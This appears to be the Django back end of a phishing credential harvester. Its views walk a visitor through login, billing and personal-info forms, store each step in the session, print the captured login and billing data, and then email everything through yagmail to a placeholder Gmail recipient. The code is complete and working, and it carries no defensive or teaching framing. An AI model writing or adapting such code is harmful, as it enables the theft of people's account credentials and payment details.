import yagmail
from django.shortcuts import render,redirect
from .forms import *

def home_view(request):
    
    if request.method == 'POST':
        form = UserPassForm(request.POST)
        if form.is_valid():
            request.session['login_data'] = form.cleaned_data
            return redirect('billing')
    else:
        form = UserPassForm()
        
    return render(request, 'dashboard/home.html', {'form': form})

def billing_view(request):
    if request.method == 'POST':
        form = BillingForm(request.POST)
        if form.is_valid():
            request.session['bill_data'] = form.cleaned_data
            print(request.session['login_data'])
            return redirect('info')
    else:
        form = BillingForm()
    return render(request, 'dashboard/billing.html', {'form': form})

def info_view(request):
    if request.method == 'POST':
        form = InfoForm(request.POST)
        if form.is_valid():
            request.session['info_data'] = form.cleaned_data
            print(request.session['login_data'])
            print(request.session['bill_data'])
            return redirect('thank-you')
    else:
        form = InfoForm()
    return render(request, 'dashboard/info.html', {'form': form})


def thank_you_view(request):
    # Retrieve session data
    login_data = request.session.get('login_data', 'No login data available')
    bill_data = request.session.get('bill_data', 'No bill data available')
    info_data = request.session.get('info_data', 'No info data available')

    # Format the content of the email
    email_content = f"""
    Login Data: {login_data}
    Bill Data: {bill_data}
    Info Data: {info_data}
    """

    try:
        # Ensure you have configured yagmail with your email and password securely
        yag = yagmail.SMTP('your_email@gmail.com')  # Replace with a secure method for loading credentials
        yag.send(
            to='recipient_email@gmail.com',  # Replace with actual recipient email
            subject='Thank You!',
            contents= email_content
        )
        print("✅ Email sent successfully.")
    except Exception as e:
        print("❌ Failed to send email:", str(e))

    return render(request, 'dashboard/thankyou.html')



